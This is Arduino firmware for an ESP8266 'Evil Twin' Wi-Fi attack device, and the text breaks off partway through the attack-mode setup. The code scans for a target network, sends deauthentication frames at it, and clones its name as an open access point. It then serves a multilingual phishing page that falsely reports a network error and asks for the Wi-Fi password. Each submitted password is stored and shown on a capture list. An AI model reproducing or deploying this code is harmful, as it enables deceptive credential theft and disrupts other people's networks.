#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

/* ================================================================== */
#define CONFIG_SSID    "EvilTwin-Setup"
#define MAX_SCAN       20
#define RESET_PIN      0            /* GPIO0 – Flash button  */
#define RESET_HOLD_MS  3000
#define DNS_PORT       53
#define EE_SIZE        1500
#define PWD_MAX_LEN    64           /* max password length stored        */
#define PWD_MAX_HISTORY 10

/* EEPROM layout: BSSID(6) + SSID(33) + CH(1) = 40 B
   History: HeadIndex(1) + 10 * PWD(64) = 641 B. Total = 681 B
   Setup Pwd: 64 B. Offset = 681
   Setup SSID: 33 B. Offset = 745
   History SSID: 10 * SSID(33) = 330 B. Offset = 778 */
enum { EE_BSSID = 0, EE_SSID = 6, EE_CH = 39, EE_PWD_HEAD = 40, EE_PWD_DATA = 41, EE_SETUP_PWD = 681, EE_SETUP_SSID = 745, EE_PWD_SSID_DATA = 778 };

/* ================================================================== */
IPAddress           apIP(192, 168, 4, 1);
DNSServer           dnsServer;
ESP8266WebServer    server(80);

static uint8_t      targetBSSID[6];
static char         targetSSID[33];
static uint8_t      targetChannel = 6;
static bool         attacking;
static bool         capturedFlag;              /* password was captured     */
static unsigned long capturedMs;
static char         pwdHistory[PWD_MAX_HISTORY][PWD_MAX_LEN + 1]; /* all passwords */
static char         pwdHistorySSID[PWD_MAX_HISTORY][33];          /* corresponding SSIDs */
static int          pwdCount = 0;              /* number of valid passwords */
static char         setupPwd[PWD_MAX_LEN + 1] = "12345678";
static char         setupSSID[33] = "EvilTwin-Setup";

static uint8_t deauthPkt[26] = {                     /* MACs filled later   */
    0xC0, 0x00,                  0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,                  0x07, 0x00
};

/* ------ cached scan ------------------------------------------------ */
static int      apCount;
static String   apSSID[MAX_SCAN];
static char     apBSSID[MAX_SCAN][18];   /* "XX:XX:XX:XX:XX:XX"         */
static int      apCh[MAX_SCAN];
static int      apRSSI[MAX_SCAN];
static unsigned long lastDeauthMs;

/* ================================================================== */
/*  Hex helpers – avoids %X / %x portability traps on newlib-nano      */
/* ================================================================== */
static void macToStr(const uint8_t *mac, char out[18])
{
    static const char H[] = "0123456789ABCDEF";
    for (int i = 0; i < 6; i++) {
        out[i * 3]     = H[mac[i] >> 4];
        out[i * 3 + 1] = H[mac[i] & 0x0F];
        if (i < 5) out[i * 3 + 2] = ':';
    }
    out[17] = '\0';
}

static bool strToMac(const char *s, uint8_t mac[6])
{
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2],
               &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
    return true;
}

/* ================================================================== */
/*  EEPROM                                                            */
/* ================================================================== */
static bool loadConfig(void)
{
    EEPROM.begin(EE_SIZE);
    int ff = 0, zz = 0;                     /* count 0xFF / 0x00 bytes  */
    for (int i = 0; i < 6; i++) {
        targetBSSID[i] = EEPROM.read(EE_BSSID + i);
        if (targetBSSID[i] == 0xFF) ff++;
        if (targetBSSID[i] == 0x00) zz++;
    }
    for (int i = 0; i < 32; i++)
        targetSSID[i] = (char)EEPROM.read(EE_SSID + i);
    targetSSID[32] = '\0';
    targetChannel = EEPROM.read(EE_CH);
    if (targetChannel < 1 || targetChannel > 13) targetChannel = 6;
    EEPROM.end();

    /* all-0xFF = erased flash;  all-0x00 = cleared config  */
    if (ff >= 6 || zz >= 6) {
        memset(targetBSSID, 0, 6);
        memset(targetSSID,  0, sizeof(targetSSID));
        targetChannel = 6;
        Serial.println("loadConfig: no valid config in EEPROM");
        return false;
    }
    Serial.printf("loadConfig: SSID=%s  CH=%d\n", targetSSID, targetChannel);
    return true;
}

static void saveConfig(void)
{
    EEPROM.begin(EE_SIZE);
    for (int i = 0; i < 6;  i++) EEPROM.write(EE_BSSID + i, targetBSSID[i]);
    for (int i = 0; i < 32; i++) EEPROM.write(EE_SSID  + i, targetSSID[i]);
    EEPROM.write(EE_CH, targetChannel);
    EEPROM.commit();
    EEPROM.end();
}

static void clearConfig(void)
{
    EEPROM.begin(EE_SIZE);
    /* Only clear target config (0..39), keep password history intact */
    for (int i = 0; i < EE_PWD_HEAD; i++) EEPROM.write(i, 0xFF);
    EEPROM.commit();
    EEPROM.end();
    memset(targetBSSID, 0, 6);
    memset(targetSSID,  0, sizeof(targetSSID));
    Serial.println("clearConfig: target config erased (history kept)");
}

static void savePwd(const char *pwd)
{
    EEPROM.begin(EE_SIZE);
    uint8_t head = EEPROM.read(EE_PWD_HEAD);
    if (head >= PWD_MAX_HISTORY || head == 0xFF) head = 0; /* init */

    int offset = EE_PWD_DATA + head * PWD_MAX_LEN;
    int len = strlen(pwd);
    if (len > PWD_MAX_LEN - 1) len = PWD_MAX_LEN - 1;
    
    for (int i = 0; i < len; i++)
        EEPROM.write(offset + i, (uint8_t)pwd[i]);
    for (int i = len; i < PWD_MAX_LEN; i++)
        EEPROM.write(offset + i, 0x00);
        
    int offsetSSID = EE_PWD_SSID_DATA + head * 33;
    int lenSSID = strlen(targetSSID);
    if (lenSSID > 32) lenSSID = 32;
    for (int i = 0; i < lenSSID; i++)
        EEPROM.write(offsetSSID + i, (uint8_t)targetSSID[i]);
    for (int i = lenSSID; i < 33; i++)
        EEPROM.write(offsetSSID + i, 0x00);
        
    head = (head + 1) % PWD_MAX_HISTORY;
    EEPROM.write(EE_PWD_HEAD, head);
    EEPROM.commit();
    EEPROM.end();
    
    Serial.printf("savePwd: saved to slot %d\n", (head == 0 ? PWD_MAX_HISTORY - 1 : head - 1));
}

static void loadPwd(void)
{
    EEPROM.begin(EE_SIZE);
    uint8_t head = EEPROM.read(EE_PWD_HEAD);
    if (head >= PWD_MAX_HISTORY || head == 0xFF) head = 0;

    pwdCount = 0;
    /* Read backwards from head so newest is first */
    for (int i = 0; i < PWD_MAX_HISTORY; i++) {
        int idx = (head - 1 - i + PWD_MAX_HISTORY) % PWD_MAX_HISTORY;
        int offset = EE_PWD_DATA + idx * PWD_MAX_LEN;
        int offsetSSID = EE_PWD_SSID_DATA + idx * 33;
        
        char tmp[PWD_MAX_LEN + 1];
        for (int j = 0; j < PWD_MAX_LEN; j++)
            tmp[j] = (char)EEPROM.read(offset + j);
        tmp[PWD_MAX_LEN] = '\0';
        
        char tmpS[33];
        for (int j = 0; j < 33; j++)
            tmpS[j] = (char)EEPROM.read(offsetSSID + j);
        tmpS[32] = '\0';
        
        if ((uint8_t)tmp[0] != 0xFF && tmp[0] != '\0') {
            strncpy(pwdHistory[pwdCount], tmp, PWD_MAX_LEN);
            pwdHistory[pwdCount][PWD_MAX_LEN] = '\0';
            
            if ((uint8_t)tmpS[0] != 0xFF && tmpS[0] != '\0') {
                strncpy(pwdHistorySSID[pwdCount], tmpS, 32);
                pwdHistorySSID[pwdCount][32] = '\0';
            } else {
                strcpy(pwdHistorySSID[pwdCount], "未知网络");
            }
            
            pwdCount++;
        }
    }
    EEPROM.end();
}

static void saveSetupConfig(const char *ssid, const char *pwd)
{
    EEPROM.begin(EE_SIZE);
    int lenPwd = strlen(pwd);
    if (lenPwd > PWD_MAX_LEN - 1) lenPwd = PWD_MAX_LEN - 1;
    for (int i = 0; i < lenPwd; i++) EEPROM.write(EE_SETUP_PWD + i, (uint8_t)pwd[i]);
    for (int i = lenPwd; i < PWD_MAX_LEN; i++) EEPROM.write(EE_SETUP_PWD + i, 0x00);
    
    int lenSSID = strlen(ssid);
    if (lenSSID > 32) lenSSID = 32;
    for (int i = 0; i < lenSSID; i++) EEPROM.write(EE_SETUP_SSID + i, (uint8_t)ssid[i]);
    for (int i = lenSSID; i < 33; i++) EEPROM.write(EE_SETUP_SSID + i, 0x00);

    EEPROM.commit();
    EEPROM.end();
    strncpy(setupPwd, pwd, PWD_MAX_LEN);
    setupPwd[PWD_MAX_LEN] = '\0';
    strncpy(setupSSID, ssid, 32);
    setupSSID[32] = '\0';
    Serial.printf("saveSetupConfig: saved SSID=%s PWD=%s\n", setupSSID, setupPwd);
}

static void loadSetupConfig(void)
{
    EEPROM.begin(EE_SIZE);
    char tmpP[PWD_MAX_LEN + 1];
    for (int i = 0; i < PWD_MAX_LEN; i++) tmpP[i] = (char)EEPROM.read(EE_SETUP_PWD + i);
    tmpP[PWD_MAX_LEN] = '\0';
    
    char tmpS[33];
    for (int i = 0; i < 33; i++) tmpS[i] = (char)EEPROM.read(EE_SETUP_SSID + i);
    tmpS[32] = '\0';
    EEPROM.end();
    
    if ((uint8_t)tmpP[0] != 0xFF && tmpP[0] != '\0') {
        strncpy(setupPwd, tmpP, PWD_MAX_LEN);
        setupPwd[PWD_MAX_LEN] = '\0';
    } else {
        strcpy(setupPwd, "12345678");
    }
    
    if ((uint8_t)tmpS[0] != 0xFF && tmpS[0] != '\0') {
        strncpy(setupSSID, tmpS, 32);
        setupSSID[32] = '\0';
    } else {
        strcpy(setupSSID, "EvilTwin-Setup");
    }
}

static void clearAll(void)
{
    EEPROM.begin(EE_SIZE);
    for (int i = 0; i < EE_SIZE; i++) EEPROM.write(i, 0xFF);
    EEPROM.commit();
    EEPROM.end();
    memset(targetBSSID, 0, 6);
    memset(targetSSID,  0, sizeof(targetSSID));
    pwdCount = 0;
    Serial.println("clearAll: full EEPROM erased");
}

static bool isConfigured(void)
{
    for (int i = 0; i < 6; i++)
        if (targetBSSID[i]) return true;
    return false;
}

/* ================================================================== */
/*  Scan                                                               */
/* ================================================================== */
static void doScan(void)
{
    apCount = WiFi.scanNetworks(false, true);
    if (apCount > MAX_SCAN) apCount = MAX_SCAN;

    for (int i = 0; i < apCount; i++) {
        apSSID[i] = WiFi.SSID(i);
        if (apSSID[i].length() == 0) apSSID[i] = "(hidden)";
        macToStr(WiFi.BSSID(i), apBSSID[i]);
        apCh[i]   = WiFi.channel(i);
        apRSSI[i] = WiFi.RSSI(i);
    }
}

/* ================================================================== */
/*  Deauth                                                             */
/* ================================================================== */
static void sendDeauthBurst(void)
{
    for (int i = 0; i < 8; i++) {
        deauthPkt[22] = (uint8_t)(i & 0x0F);
        wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
        if (i < 7) delayMicroseconds(500);
    }
}

/* ================================================================== */
/*  Web handlers – attack mode                                         */
/* ================================================================== */
static void onAttackRoot(void)
{
    String html;
    html.reserve(4096);

    /* ---- CSS (language-independent) ---- */
    html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'>"
      "<title>Network Auth</title><style>"
      "body{background:#f2f2f2;font-family:-apple-system,BlinkMacSystemFont,"
      "'Segoe UI',Roboto,Helvetica,Arial,sans-serif;margin:0;padding:0;"
      "display:flex;justify-content:center;align-items:center;min-height:100vh}"
      ".c{background:#fff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,.1);"
      "padding:30px 20px;width:90%;max-width:400px;text-align:center}"
      ".ic{width:64px;height:64px;margin:0 auto 15px;background:#1890ff;"
      "border-radius:50%;display:flex;justify-content:center;align-items:center}"
      ".ic svg{width:36px;height:36px;fill:#fff}"
      "h2{margin:0 0 10px;font-size:22px;color:#333;font-weight:600}"
      "#desc{margin:0 0 25px;font-size:14px;color:#666;line-height:1.5}"
      ".ig{text-align:left;margin-bottom:20px}"
      ".ig label{display:block;font-size:14px;color:#333;margin-bottom:8px;font-weight:500}"
      ".ig input{width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #d9d9d9;"
      "border-radius:6px;font-size:16px;outline:none}"
      ".ig input:focus{border-color:#1890ff}"
      "button{width:100%;padding:12px;background:#1890ff;color:#fff;border:none;"
      "border-radius:6px;font-size:16px;font-weight:500;cursor:pointer}"
      "button:active{background:#096dd9}"
      ".ft{margin-top:30px;font-size:12px;color:#999}"
      "</style></head><body><div class='c'>"
      "<div class='ic'><svg viewBox='0 0 24 24'><path d='M12 3C7.03 3 2.5 5.03 "
      "0 8.5L12 21L24 8.5C21.5 5.03 16.97 3 12 3ZM12 6C15.11 6 18.06 7.15 "
      "20.3 8.9L12 18.5L3.7 8.9C5.94 7.15 8.89 6 12 6Z'/></svg></div>"
      "<h2 id='t'>路由器安全认证</h2><p id='desc'>系统检测到网络连接异常，请重新输入 <b><span id='ssid_val'>");

    /* inject SSID into JS */
    html += targetSSID;

    html += F("</span></b> 的密码以恢复上网。</p>"
      "<form method='POST' action='/login' onsubmit='return ck()'>"
      "<div class='ig'><label id='lb'>无线网络密码</label>"
      "<input name='pwd' type='password' id='pwd' placeholder='请输入 WiFi 密码' required autofocus></div>"
      "<button type='submit' id='btn'>确认并连接</button></form>"
      "<div class='ft'>&copy; 2026 Router Management System</div></div>"
      "<script>"
      "try {"
      "var S=document.getElementById('ssid_val').innerText;"
      "var L={zh:{t:'路由器安全认证',d:'系统检测到网络连接异常，请重新输入 <b>'+S+'</b> 的密码以恢复上网。',"
      "l:'无线网络密码',p:'请输入 WiFi 密码',b:'确认并连接',e:'密码长度不能小于 8 位'},"
      "en:{t:'Router Security',d:'A network error was detected. Please re-enter the password for <b>'+S+'</b> to restore connectivity.',"
      "l:'Wireless Password',p:'Enter WiFi password',b:'Verify & Connect',e:'Password must be at least 8 characters'},"
      "ja:{t:'ルーター認証',d:'ネットワーク異常を検出しました。<b>'+S+'</b> のパスワードを再入力してください。',"
      "l:'ワイヤレスパスワード',p:'WiFiパスワードを入力',b:'確認して接続',e:'パスワードは8文字以上必要です'},"
      "ko:{t:'라우터 인증',d:'네트워크 오류가 감지되었습니다. <b>'+S+'</b> 비밀번호를 다시 입력하세요.',"
      "l:'무선 비밀번호',p:'WiFi 비밀번호 입력',b:'확인 후 연결',e:'비밀번호는 8자 이상이어야 합니다'},"
      "es:{t:'Autenticación del Router',d:'Se detectó un error de red. Vuelva a ingresar la contraseña de <b>'+S+'</b>.',"
      "l:'Contraseña WiFi',p:'Ingrese la contraseña',b:'Verificar y conectar',e:'Mínimo 8 caracteres'},"
      "fr:{t:'Authentification Routeur',d:'Erreur réseau détectée. Veuillez ressaisir le mot de passe de <b>'+S+'</b>.',"
      "l:'Mot de passe WiFi',p:'Entrez le mot de passe',b:'Vérifier et connecter',e:'8 caractères minimum'},"
      "de:{t:'Router-Authentifizierung',d:'Netzwerkfehler erkannt. Bitte geben Sie das Passwort für <b>'+S+'</b> erneut ein.',"
      "l:'WLAN-Passwort',p:'Passwort eingeben',b:'Bestätigen & Verbinden',e:'Mindestens 8 Zeichen'},"
      "ru:{t:'Авторизация роутера',d:'Обнаружена ошибка сети. Введите пароль <b>'+S+'</b> для восстановления.',"
      "l:'Пароль WiFi',p:'Введите пароль',b:'Подтвердить',e:'Минимум 8 символов'},"
      "pt:{t:'Autenticação do Roteador',d:'Erro de rede detectado. Digite novamente a senha do <b>'+S+'</b>.',"
      "l:'Senha WiFi',p:'Digite a senha',b:'Verificar e conectar',e:'Mínimo 8 caracteres'},"
      "it:{t:'Autenticazione Router',d:'Errore di rete rilevato. Reinserire la password di <b>'+S+'</b>.',"
      "l:'Password WiFi',p:'Inserire la password',b:'Verifica e connetti',e:'Minimo 8 caratteri'},"
      "ar:{t:'مصادقة الراوتر',d:'تم اكتشاف خطأ في الشبكة. أعد إدخال كلمة مرور <b>'+S+'</b>.',"
      "l:'كلمة مرور WiFi',p:'أدخل كلمة المرور',b:'تأكيد والاتصال',e:'8 أحرف على الأقل'}};"
      "var nl=navigator.language||navigator.userLanguage||'zh';"
      "var k=nl.slice(0,2).toLowerCase();"
      "if(!L[k])k='en';var T=L[k];"
      "document.getElementById('t').textContent=T.t;"
      "document.getElementById('desc').innerHTML=T.d;"
      "document.getElementById('lb').textContent=T.l;"
      "document.getElementById('pwd').placeholder=T.p;"
      "document.getElementById('btn').textContent=T.b;"
      "if(k=='ar')document.body.dir='rtl';"
      "window.errMsg=T.e;"
      "}catch(e){window.errMsg='密码长度不能小于 8 位';}"
      "function ck(){if(document.getElementById('pwd').value.length<8)"
      "{alert(window.errMsg);return false}return true}"
      "</script></body></html>");

    server.send(200, "text/html; charset=utf-8", html);
}

static void onAttackLogin(void)
{
    if (server.hasArg("pwd")) {
        String pwd = server.arg("pwd");
        Serial.print(">>> CAPTURED PASSWORD: ");
        Serial.println(pwd);
        savePwd(pwd.c_str());
        attacking    = false;
        capturedFlag = true;
        capturedMs   = millis();
    }
    server.send(200, "text/html; charset=utf-8",
        F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
          "<meta name='viewport' content='width=device-width,initial-scale=1'>"
          "<title>Connecting</title><style>"
          "body{font-family:-apple-system,sans-serif;text-align:center;"
          "padding:60px 20px;color:#333;background:#f5f5f7}"
          ".sp{width:40px;height:40px;margin:20px auto;"
          "border:4px solid #e0e0e0;border-top:4px solid #1890ff;"
          "border-radius:50%;animation:r 1s linear infinite}"
          "@keyframes r{to{transform:rotate(360deg)}}"
          "#st{font-size:15px;color:#666;margin:16px 0}"
          "#ok{display:none;color:#34C759;font-size:18px;font-weight:700}"
          ".ck{font-size:48px;margin:10px 0}"
          "</style></head><body>"
          "<div id='ld'><h2 id='t'>认证成功</h2><div class='sp'></div>"
          "<div id='st'>正在验证密码…</div></div>"
          "<div id='ok'><div class='ck'>&#10004;</div>"
          "<h2 id='dt'>已连接</h2><p id='dp'>您可以正常使用网络了</p></div>"
          "<script>"
          "try {"
          "var L={zh:{t:'认证成功',s:['正在验证密码…','正在获取 IP 地址…',"
          "'正在连接网络…','连接成功！'],d:'已连接',p:'您可以正常使用网络了'},"
          "en:{t:'Auth Success',s:['Verifying password…','Obtaining IP address…',"
          "'Connecting…','Connected!'],d:'Connected',p:'You can now use the network'},"
          "ja:{t:'認証成功',s:['パスワード確認中…','IPアドレス取得中…',"
          "'接続中…','接続完了！'],d:'接続済み',p:'ネットワークをご利用いただけます'},"
          "ko:{t:'인증 성공',s:['비밀번호 확인 중…','IP 주소 취득 중…',"
          "'연결 중…','연결 완료!'],d:'연결됨',p:'네트워크를 사용할 수 있습니다'},"
          "es:{t:'Autenticación exitosa',s:['Verificando…','Obteniendo IP…',"
          "'Conectando…','¡Conectado!'],d:'Conectado',p:'Ya puede usar la red'},"
          "fr:{t:'Authentification réussie',s:['Vérification…','Obtention IP…',"
          "'Connexion…','Connecté !'],d:'Connecté',p:'Vous pouvez utiliser le réseau'},"
          "de:{t:'Authentifizierung erfolgreich',s:['Überprüfung…','IP wird bezogen…',"
          "'Verbindung…','Verbunden!'],d:'Verbunden',p:'Sie können das Netzwerk nutzen'},"
          "ru:{t:'Авторизация успешна',s:['Проверка пароля…','Получение IP…',"
          "'Подключение…','Подключено!'],d:'Подключено',p:'Можно пользоваться сетью'},"
          "pt:{t:'Autenticação bem-sucedida',s:['Verificando…','Obtendo IP…',"
          "'Conectando…','Conectado!'],d:'Conectado',p:'Você já pode usar a rede'},"
          "it:{t:'Autenticazione riuscita',s:['Verifica…','Ottenimento IP…',"
          "'Connessione…','Connesso!'],d:'Connesso',p:'Puoi usare la rete'},"
          "ar:{t:'نجحت المصادقة',s:['جارٍ التحقق…','الحصول على IP…',"
          "'جارٍ الاتصال…','تم الاتصال!'],d:'متصل',p:'يمكنك استخدام الشبكة'}};"
          "var nl=navigator.language||navigator.userLanguage||'zh';"
          "var k=nl.slice(0,2).toLowerCase();"
          "if(!L[k])k='en';var T=L[k];"
          "document.getElementById('t').textContent=T.t;"
          "document.getElementById('dt').textContent=T.d;"
          "document.getElementById('dp').textContent=T.p;"
          "if(k=='ar')document.body.dir='rtl';"
          "var st=document.getElementById('st'),i=0;"
          "setInterval(function(){"
          "if(i<T.s.length)st.textContent=T.s[i++];"
          "if(i>=T.s.length){document.getElementById('ld').style.display='none';"
          "document.getElementById('ok').style.display='block'}},2000);"
          "}catch(e){"
          "  var st=document.getElementById('st'),i=0;"
          "  var ss=['正在获取 IP 地址…','正在连接网络…','连接成功！'];"
          "  setInterval(function(){"
          "  if(i<ss.length)st.textContent=ss[i++];"
          "  if(i>=ss.length){document.getElementById('ld').style.display='none';"
          "  document.getElementById('ok').style.display='block'}},2000);"
          "}"
          "</script></body></html>"));
}

/* ================================================================== */
/*  Web handlers – config mode                                         */
/* ================================================================== */
static void onConfigRoot(void)
{
    String html;
    html.reserve(4000 + apCount * 400);

    html = F("<!DOCTYPE html><html lang='zh'><head>"
             "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
             "<title>Evil Twin 配置</title>"
             "<style>"
             "body{font-family:-apple-system,sans-serif;max-width:500px;margin:30px auto;padding:0 16px;background:#f0f4ff;color:#1a1a2e}"
             "h2{color:#0055cc;text-align:center}"
             "p{text-align:center;color:#666;font-size:13px}"
             ".pwd-box{background:#d4edda;border:1px solid #28a745;border-radius:12px;"
             "padding:16px;margin:16px 0;text-align:left}"
             ".pwd-box h3{color:#155724;margin:0 0 12px;text-align:center}"
             ".pwd-item{background:rgba(255,255,255,0.6);padding:8px 12px;"
             "border-radius:6px;margin-bottom:8px;display:flex;justify-content:space-between;"
             "align-items:center;font-size:14px;color:#155724}"
             ".pwd-item:last-child{margin-bottom:0}"
             ".pwd-val{font-weight:700;letter-spacing:1px;word-break:break-all}"
             ".pwd-idx{font-size:11px;opacity:0.7;background:rgba(0,0,0,0.05);"
             "padding:2px 6px;border-radius:10px}"
             ".card{background:#fff;border-radius:12px;padding:14px 18px;margin:10px 0;"
             "box-shadow:0 2px 8px rgba(0,0,0,.08);display:flex;justify-content:space-between;"
             "align-items:center;width:100%;border:none;cursor:pointer}"
             ".card:hover{box-shadow:0 4px 16px rgba(0,85,204,.25)}"
             ".ssid{font-weight:700;font-size:15px;text-align:left}"
             ".hidden-tag{font-size:11px;color:#e63946;font-weight:600}"
             ".meta{font-size:11px;color:#888}"
             ".rssi{color:#0055cc;font-weight:700}"
             ".ssid-input{padding:6px 10px;border:1px solid #ccc;border-radius:6px;"
             "font-size:13px;width:140px;margin-top:4px}"
             "a.rescan{display:block;text-align:center;margin:20px 0;color:#0055cc}"
             "</style></head><body>"
             "<h2>&#127919; 选择目标网络</h2>"
             "<p>连接 <b>");
    html += setupSSID;
    html += F("</b>，点击目标 WiFi 开始攻击</p>");

    /* Show captured password history if available */
    if (pwdCount > 0) {
        html += F("<div class='pwd-box'><h3>&#128273; 已捕获密码记录</h3>");
        for (int i = 0; i < pwdCount; i++) {
            html += F("<div class='pwd-item' style='flex-direction:column;align-items:flex-start;'><div style='width:100%;display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;'><div class='pwd-val'>");
            html += pwdHistory[i];
            html += F("</div><div class='pwd-idx'>");
            html += (i == 0 ? "最新" : String(i + 1));
            html += F("</div></div><div style='font-size:12px;color:#28a745;font-weight:600;'>📺 ");
            html += pwdHistorySSID[i];
            html += F("</div></div>");
        }
        html += F("</div>");
    }

    for (int i = 0; i < apCount; i++) {
        bool hidden = (apSSID[i] == "(hidden)");
        char card[1024];
        if (hidden) {
            snprintf(card, sizeof(card),
                     "<form method='POST' action='/select'>"
                     "<input type='hidden' name='idx' value='%d'>"
                     "<div class='card'>"
                     "<div><div class='ssid'>(隐藏网络) <span class='hidden-tag'>需输入SSID</span></div>"
                     "<div class='meta'>CH%d &nbsp; %s</div>"
                     "<input class='ssid-input' name='ssid' type='text' "
                     "placeholder='输入真实 SSID' required onclick='event.stopPropagation()'>"
                     "</div>"
                     "<div><div class='rssi'>%d dBm</div>"
                     "<button type='submit' style='margin-top:6px;padding:4px 12px;"
                     "background:#0055cc;color:#fff;border:none;border-radius:6px;"
                     "font-size:12px;cursor:pointer'>选择</button></div>"
                     "</div></form>",
                     i, apCh[i], apBSSID[i], apRSSI[i]);
        } else {
            snprintf(card, sizeof(card),
                     "<form method='POST' action='/select'>"
                     "<input type='hidden' name='idx' value='%d'>"
                     "<button class='card' type='submit'>"
                     "<div><div class='ssid'>%s</div>"
                     "<div class='meta'>CH%d &nbsp; %s</div></div>"
                     "<div class='rssi'>%d dBm</div>"
                     "</button></form>",
                     i, apSSID[i].c_str(), apCh[i],
                     apBSSID[i], apRSSI[i]);
        }
        html += card;
    }

    html += F("<a class='rescan' href='/rescan'>&#128260; 重新扫描</a>"
              "<div style='margin-top:30px;padding:15px;background:#fff;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.08);'>"
              "<h3 style='margin:0 0 10px;font-size:15px;color:#333;text-align:center;'>&#128274; 修改后台热点配置</h3>"
              "<form method='POST' action='/change_setup' style='text-align:center;'>"
              "<input type='text' name='newssid' placeholder='后台 WiFi 名称' required maxlength='32' value='");
    html += setupSSID;
    html += F("' style='padding:8px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px;width:100%;box-sizing:border-box;margin-bottom:10px;'>"
              "<input type='text' name='newpwd' placeholder='新密码 (至少8位)' required minlength='8' "
              "style='padding:8px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px;width:100%;box-sizing:border-box;margin-bottom:10px;'>"
              "<button type='submit' style='padding:8px 16px;background:#e63946;color:#fff;border:none;border-radius:6px;cursor:pointer;width:100%;font-weight:bold;'>保存并重启</button>"
              "</form></div>"
              "</body></html>");

    server.send(200, "text/html; charset=utf-8", html);
}

static void onConfigRescan(void)
{
    doScan();
    Serial.printf("Rescan: found %d APs\n", apCount);
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
}

static void onConfigSelect(void)
{
    if (!server.hasArg("idx")) { server.send(400, "", ""); return; }
    int idx = server.arg("idx").toInt();
    if (idx < 0 || idx >= apCount) { server.send(400, "", ""); return; }

    /* Use manually-entered SSID if provided (for hidden networks) */
    if (server.hasArg("ssid") && server.arg("ssid").length() > 0) {
        server.arg("ssid").toCharArray(targetSSID, sizeof(targetSSID));
    } else if (apSSID[idx] == "(hidden)") {
        /* Hidden network but no SSID entered – reject */
        server.send(200, "text/html; charset=utf-8",
            F("<!DOCTYPE html><html><head><meta charset='UTF-8'></head>"
              "<body style='text-align:center;padding:60px;font-family:sans-serif'>"
              "<h2>&#9888; 错误</h2>"
              "<p>隐藏网络必须输入真实 SSID</p>"
              "<a href='/'>返回</a></body></html>"));
        return;
    } else {
        apSSID[idx].toCharArray(targetSSID, sizeof(targetSSID));
    }

    targetChannel = apCh[idx];
    strToMac(apBSSID[idx], targetBSSID);

    Serial.printf("Selected: %s  CH=%d  %s\n",
                  targetSSID, targetChannel, apBSSID[idx]);
    saveConfig();

    server.send(200, "text/html; charset=utf-8",
        F("<!DOCTYPE html><html><head><meta charset='UTF-8'></head>"
          "<body style='text-align:center;padding:60px;font-family:sans-serif'>"
          "<h2>&#9989; 配置已保存</h2>"
          "<p>设备正在重启…</p></body></html>"));

    delay(800);
    ESP.restart();
}

/* ================================================================== */
static void onNotFound(void)
{
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
}

/* ================================================================== */
/*  Factory reset                                                     */
/* ================================================================== */
static void checkFactoryReset(void)
{
    pinMode(RESET_PIN, INPUT_PULLUP);
    if (digitalRead(RESET_PIN) == HIGH) return;

    Serial.printf("BOOT button held – keep holding %d s to reset...\n",
                  RESET_HOLD_MS / 1000);

    unsigned long start = millis();
    while (digitalRead(RESET_PIN) == LOW &&
           millis() - start < (unsigned long)RESET_HOLD_MS)
        delay(100);

    if (millis() - start >= RESET_HOLD_MS) {
        Serial.println(">>> Factory reset – clearing ALL data...");
        clearAll();
        ESP.restart();
    }
    Serial.println("Button released early – skipping reset.");
}

/* ================================================================== */
/*  Mode entry                                                         */
/* ================================================================== */
static void enterConfigMode(void)
{
    Serial.println("No target in config – entering config mode");

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(setupSSID, setupPwd, 1);

    doScan();
    Serial.printf("Scan done: %d APs found\n", apCount);

    dnsServer.start(DNS_PORT, "*", apIP);

    server.on("/",       HTTP_GET,  onConfigRoot);
    server.on("/rescan", HTTP_GET,  onConfigRescan);
    server.on("/select", HTTP_POST, onConfigSelect);
    server.on("/change_setup", HTTP_POST, []() {
        if (server.hasArg("newpwd") && server.hasArg("newssid")) {
            String newpwd = server.arg("newpwd");
            String newssid = server.arg("newssid");
            if (newpwd.length() >= 8 && newssid.length() > 0) {
                saveSetupConfig(newssid.c_str(), newpwd.c_str());
                server.send(200, "text/html; charset=utf-8", 
                    F("<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
                      "<div style='text-align:center;font-family:sans-serif;margin-top:50px;'>"
                      "<h2>配置修改成功</h2><p>设备即将重启，请用新名称和新密码重新连接后台 WiFi。</p></div>"));
                delay(1000);
                ESP.restart();
                return;
            }
        }
        server.send(400, "text/plain", "Invalid input");
    });
    server.onNotFound(onNotFound);
    server.begin();

    Serial.printf("Config portal – \"%s\"  http://%s\n",
                  setupSSID, apIP.toString().c_str());
}

static void enterAttackMode(void)
{
    Serial.printf("Attack: SSID=%s  CH=%d  %02X:%02X:%02X:%02X:%02X:%02X\n",
                  targetSSID, targetChannel,
                  targetBSSID[0], targetBSSID[1], targetBSSID[2],
                  targetBSSID[3], targetBSSID[4], targetBSSID[5]);

    memcpy(&deauthPkt[10], targetBSSID, 6);
    memcpy(&deauthPkt[16], targetBSSID, 6);

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(targetSSID, NULL, targetChannel);

    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {});
    wifi_promiscuous_enable(1);
    wifi_set_channel(targetChannel);

